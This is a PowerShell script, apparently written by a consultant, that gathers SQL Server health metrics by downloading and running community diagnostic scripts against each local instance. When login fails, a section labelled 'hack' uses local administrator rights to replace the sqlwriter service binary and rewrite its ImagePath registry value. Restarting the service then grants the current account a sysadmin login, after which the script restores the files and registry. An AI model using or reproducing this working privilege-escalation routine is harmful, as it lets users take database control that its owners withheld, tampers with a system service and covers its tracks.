#Bismillahi Rahmanir Rahim
#Insha-Allah subhana wataala this ps1 file will grab a bunch of metrics from the SQL server, looping all instances on this machine.

#00. Configuration stuff for this scripts
Add-Type -assembly "system.io.compression.filesystem"
$currentpath = $pwd

#Exlude these files from being executed by the script when looping the .sql files
$ExludedFiles = @("sp_BlitzTrace.sql","00. TestPermission.sql","Check_BP_Servers.sql","MaintenanceSolution.sql")

$urls = @("https://ola.hallengren.com/scripts/MaintenanceSolution.sql" `
, "https://raw.githubusercontent.com/BrentOzarULTD/SQL-Server-First-Responder-Kit/dev/sp_BlitzWho.sql" `
, "https://raw.githubusercontent.com/BrentOzarULTD/SQL-Server-First-Responder-Kit/dev/sp_Blitz.sql" `
, "https://raw.githubusercontent.com/BrentOzarULTD/SQL-Server-First-Responder-Kit/dev/sp_BlitzCache.sql" `
, "https://raw.githubusercontent.com/BrentOzarULTD/SQL-Server-First-Responder-Kit/dev/sp_BlitzFirst.sql" `
, "https://raw.githubusercontent.com/BrentOzarULTD/SQL-Server-First-Responder-Kit/dev/sp_BlitzIndex.sql" `
, "https://raw.githubusercontent.com/Microsoft/tigertoolbox/master/BPCheck/Check_BP_Servers.sql" `
)

$storageDir = $pwd
$webclient = New-Object System.Net.WebClient
foreach( $url in $urls)
{
	$arr = $url -split ""
	[array]::Reverse($arr)
	$url2 = $arr -join ''
	$file = $url.Substring($url.Length - $url2.IndexOf("/"))
	$file = "$storageDir\$file"
	$webclient.DownloadFile($url,$file)
}

#Read from registry so this value doesn't ever change in the script
$path = 'HKLM:\SYSTEM\CurrentControlSet\Services\SQLWriter'
$SQLWriter_ImagePath = Get-ItemProperty $path | Select-Object -ExpandProperty "ImagePath"
$SQLWriter_ImagePathFileLocation = $SQLWriter_ImagePath.replace("sqlwriter.exe", "").replace('"', '')

#$SQLWriter_ImagePath =  "C:\Program Files\Microsoft SQL Server\90\Shared\sqlwriter.exe"
#"C:\Program Files\Microsoft SQL Server\90\Shared\sqlwriter.exe" -S <SERVER>{\INSTANCE} -E -Q "CREATE LOGIN [<DOMAIN>\lexeladmin] FROM WINDOWS; EXECUTE sp_addsrvrolemember @loginame = '<DOMAIN>\lexeladmin', @rolename = 'sysadmin'"
$account = whoami
Write-Progress -id 1 -Activity "Lexel: Running SQL data grabs" -Status "1% Complete:" -PercentComplete 1
			
#01. Get all SQL instances
$SQLInstances = (get-itemproperty 'HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server').InstalledInstances;
$Server = hostname
#01.1 Get all network instances as well
# works but slows down things $NetworkSQL = (sqlcmd -L )

#01.2 Loop all intances
foreach($SQLInstance in $SQLInstances)
{
	
	if($SQLInstance -ne "MSSQLSERVER")
	{
		$SQLInstance = "$Server\$SQLInstance"
	}
	if($SQLInstance -eq "MSSQLSERVER")
	{
		$SQLInstance = "$Server"
	}
	#$SQLInstance
	Write-Progress -id 2 -ParentId 1 -Activity "Lexel: Parsing $SQLInstance" -Status "1% Complete:" -PercentComplete 1 
	#02. Test permissions
	#$SQLInstance = "LXLSQLTRACKIT2"
	
	Try
	{
		$TestThisInstance = oSQL -S $SQLInstance -r -E -Q  "SET NOCOUNT ON;select @@servername;"
	}
	Catch [system.exception]
	{
		Write-Host 'Error during login'
	}
	
	$GetPermission = $TestThisInstance.IndexOf("Login failed") -eq 0
	#$GetPermission  = $True # We are testing here
	
	if($GetPermission)
	{
        Write-Host "Login failed, attempting to gain access"
		#Connecting to this server failed, we can brute force out way in if required
		$BruteForce = $true
		
		#02.1 Test if current user is some sort of administrator, we are looking for local or domain level admin
		
		#Running as Administrator
		$RunAsAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
		
		#Whoami binds the current user's login details, including group memberships, so we will compare that to the local admin group.
		$IsAdmin = (whoami /groups /fo csv | convertfrom-csv | where-object { $_.SID -eq "S-1-5-32-544" } | Measure-Object).Count
		
		try
		{
		if($IsAdmin -lt 1 -And $RunAsAdmin -eq $False)
		{
			Write-Host "This account is not a local administrator, cannot proceed" -BackgroundColor Orange
			if($RunAsAdmin -eq $False)
			{
				Write-Host "Not Running as Administrator, please try again" -BackgroundColor Orange
			}
		}
		else
		{
			Write-Host "You are a local admin, awesome, let's hack this sucker" -Foregroundcolor Green
			$I = 5
			Write-Progress -id 2 -ParentId 1 -Activity "Hacking $SQLInstance in Progress" -Status "$I% Complete:" -PercentComplete $I
			
			$extractfiles = @("sqlwriter_hack.zip")
			foreach($extractfile in $extractfiles)
			{
				$BackUpPath = "$currentpath\$extractfile"
				$Destination = "$currentpath\"
                try 
                {
                    [io.compression.zipfile]::ExtractToDirectory($BackUpPath, $destination)
                }
                catch
                {
                    #file already exists
                }
				
			}
			$I = 10
			Write-Progress -Activity "Hacking $SQLInstance in Progress" -Status "$I% Complete:" -PercentComplete $I
			#We won't try to gain access using PsExec, but will directly grant sysadmin rights to this account on the SQL server.
			Write-Host "You are about to force access to the $SQLInstance SQL instance" -Foregroundcolor Red
			
			
			#Stop the VSS writer service
			#Write-Host "DEBUG > Stopping SQLWriter Service"
			Stop-Service sqlwriter
			$svc = Get-Service sqlwriter
			while($svc.State -ne 'Stopped')
			{
			   Start-Sleep -Seconds 0.5
			   Write-Host "Wiating for SQL Writer to stop"
			}
			
			
			#Rename the original SQL Writer to a bak_ version
			#Write-Host "DEBUG > renaming sqlwriter files"
			Rename-Item $SQLWriter_ImagePath.replace('"', '') bak_sqlwriter.exe
			Rename-Item "$currentpath\sqlwriter_hack.exe" sqlwriter.exe
			
			Copy-Item "$currentpath\sqlwriter.exe" $SQLWriter_ImagePathFileLocation
			$I = 15
			Write-Progress -Activity "Hacking $SQLInstance in Progress" -Status "$I% Complete:" -PercentComplete $I
			$newvalue = ''+$SQLWriter_ImagePath+' -S '+$SQLInstance+' -E -Q "CREATE LOGIN ['+$account+'] FROM WINDOWS; EXECUTE sp_addsrvrolemember @loginame = '''+$account+''', @rolename = ''sysadmin''"'
			Get-ItemProperty -path $path -name ImagePath -ErrorAction SilentlyContinue | % { Set-ItemProperty -path $_.PSPath -name ImagePath $newvalue }
			try
			{
				#The restart will fail becuase of the change in registry that now granted access to the instance
				Restart-Service sqlwriter# -ErrorAction Stop
			}
			catch
			{
				$I = 45
				Write-Progress -Activity "Hacking $SQLInstance in Progress" -Status "$I% Complete:" -PercentComplete $I
			}
			#put the files back
			Remove-Item "$SQLWriter_ImagePathFileLocation\sqlwriter.exe"
			Rename-Item $SQLWriter_ImagePathFileLocation\bak_sqlwriter.exe  sqlwriter.exe
			Remove-Item "$currentpath\sqlwriter.exe"
			$I = 65
			Write-Progress -Activity "Hacking $SQLInstance in Progress" -Status "$I% Complete:" -PercentComplete $I
			
			Get-ItemProperty -path $path -name ImagePath -ErrorAction SilentlyContinue | % { Set-ItemProperty -path $_.PSPath -name ImagePath $SQLWriter_ImagePath }
			Restart-Service sqlwriter
			$I = 100
			Write-Progress -Activity "Hacking $SQLInstance in Progress" -Status "$I% Complete:" -PercentComplete $I	
			Write-host "Congratulations, you should now be a sysadmin on this SQL instance"
		}
		}
		catch
		{
			Get-ItemProperty -path $path -name ImagePath -ErrorAction SilentlyContinue | % { Set-ItemProperty -path $_.PSPath -name ImagePath $SQLWriter_ImagePath }
			Write-Host "Error: Check $path for the correct sqlwriter.exe file, compare to bak_sqlwriter" -Foregroundcolor Red
			Write-Host "File Location: $SQLWriter_ImagePathFileLocation" -Foregroundcolor Red
			Write-Host "Original value: $SQLWriter_ImagePath" -Foregroundcolor Red
			$currentvalue = Get-ItemProperty $path | Select-Object -ExpandProperty "ImagePath"
			Write-Host "Current value : $currentvalue" -Foregroundcolor Red
			Invoke-Item $SQLWriter_ImagePathFileLocation
			
		}
		
		
	}
	Write-Progress -id 2 -ParentId 1 -Activity "Lexel: Parsing $SQLInstance" -Status "25% Complete:" -PercentComplete 25 

	#03. Now we will run the SQL scripts in this folder against each instance

	#Get file names to run
	$Folder = $pwd
	$FileNames = Get-ChildItem -Path $Folder -Filter "*.sql" -exclude "Maintenance*","*Test*", "*BP_*" -Name | Sort-Object
	
	#Let's create the store procedures that we will be using, note that we are filtering only scripts that generate stored procedures
	#Run SQLCMD for each file
	
	ForEach ($FileName in $FileNames)
	{
		if(!($ExludedFiles -contains $File))
		{
			#If the file is not in the exluded list then run it
			$File = $Folder.Path + "\" + $FileName
			$OutFile = $File + ".csv"
			#sqlcmd -S $SQLInstance -E -i $File -s "~" -o $OutFile
			sqlcmd -S $SQLInstance -E -I -i $File
		}
	}
	
	#Now we need to run the stored procedures
	
	#sqlcmd -S $SQLInstance -Q "" -i $File -s "~" -o $OutFile;
	$SQLnameforfile = $SQLInstance.Replace("\","_");
	$timestampforfile =  (get-date).ToString('yyyy_MM_dd_HH_mm');
	Write-Progress -id 3 -ParentId 2 -Activity "Lexel: Running SQL sp_Blitz" -Status "0% Complete:" -PercentComplete 0
	$OutFile = "$pwd" + "\" + $SQLnameforfile + "_" + $timestampforfile + "_sp_Blitz.csv"
	$SQLQuery = "EXEC [dbo].[sp_Blitz] @CheckUserDatabaseObjects = 1 ,@CheckProcedureCache = 1 ,@OutputType = 'TABLE' ,@OutputProcedureCache = 0 ,@CheckProcedureCacheFilter = NULL,@CheckServerInfo = 1;" 
	invoke-sqlcmd -ServerInstance $SQLInstance "$SQLQuery"  | export-csv -notypeinformation -path $OutFile
	
	Write-Progress -id 3 -ParentId 2 -Activity "Lexel: Running SQL sp_BlitzIndex" -Status "25% Complete:" -PercentComplete 25
	$OutFile = "$pwd" + "\" + $SQLnameforfile + "_" + $timestampforfile + "_sp_BlitzIndex.csv"
	$SQLQuery = "EXEC [dbo].[sp_BlitzIndex] @Mode = 4, @SkipStatistics = 0, @GetAllDatabases = 1, @OutputServerName = 1, @OutputDatabaseName = 1;"
	invoke-sqlcmd -ServerInstance $SQLInstance "$SQLQuery"  | export-csv -notypeinformation -path $OutFile
	
	Write-Progress -id 3 -ParentId 2 -Activity "Lexel: Running SQL the_management_script" -Status "50% Complete:" -PercentComplete 50
	$OutFile = "$pwd" + "\" + $SQLnameforfile + "_" + $timestampforfile + "_the_management_script.csv"
	$SQLQuery = "EXEC [dbo].[the_management_script] @TopQueries = 50, @FTECost  = 60000, @ShowQueryPlan = 0, @PrepForExport = 1;"
	invoke-sqlcmd -ServerInstance $SQLInstance "$SQLQuery"  | export-csv -notypeinformation -path $OutFile
	
	Write-Progress -id 3 -ParentId 2 -Activity "Lexel: Running SQL the_management_performance_report" -Status "75% Complete:" -PercentComplete 75
	$OutFile = "$pwd" + "\" + $SQLnameforfile + "_" + $timestampforfile + "_the_management_performance_report.csv"
	$SQLQuery = "EXEC [dbo].[the_management_performance_report] @MinExecutionCount = 5;"
	invoke-sqlcmd -ServerInstance $SQLInstance "$SQLQuery"  | export-csv -notypeinformation -path $OutFile
	
	Write-Progress -id 3 -ParentId 2 -Activity "Lexel: Running SQL completed" -Status "100% Complete:" -PercentComplete 100
	
	Write-Progress -id 2 -ParentId 1 -Activity "Lexel: Parsing $SQLInstance" -Status "25% Complete:" -PercentComplete 100 
	
	$progress_overall = [math]::floor(95/($SQLInstances.Count))
	Write-Progress -id 1 -Activity "Lexel: Running SQL data grabs" -Status "$progress_overall% Complete:" -PercentComplete $progress_overall

}
#	#Run SQLCMD for each file
#	ForEach ($FileName in $FileNames)
#
#	{
#	 $File = $Folder + $FileName
#	sqlcmd -S $SQLInstance -i $File
#
#	}


